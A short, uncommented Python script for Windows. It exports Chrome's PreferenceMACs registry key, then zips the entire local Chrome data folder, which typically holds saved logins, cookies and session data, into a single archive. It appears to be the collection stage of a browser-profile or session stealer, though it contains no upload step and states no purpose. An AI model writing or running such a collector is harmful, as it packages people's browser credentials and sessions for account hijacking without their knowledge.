from os import system, path, environ, walk
from zipfile import ZipFile, ZIP_DEFLATED
Path = "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\export.reg"

# ------------------- get data -----------------
def getData():
    system(f"REG EXPORT HKEY_CURRENT_USER\\Software\\Google\\Chrome\\PreferenceMACs {Path}")
    return True
# ------------------- get data -----------------

# ------------------- zip data -----------------


def createzip():
    folder_path = path.join(environ['userprofile'], "appdata", "local", "google", "chrome")
    zip_path = path.join(environ['userprofile'], "appdata", "local", "google", "reg.zip")

    if path.exists(folder_path):
        with ZipFile(zip_path, "w", compression= ZIP_DEFLATED) as zipobj:
            for root, _, files in walk(folder_path):
                for file in files:
                    file_path = path.join(root, file)
                    zipobj.write(file_path, path.relpath(file_path, folder_path))

        return True
    else:
        return "Folder does not exist."

getData()
zipData = createzip()
print(zipData)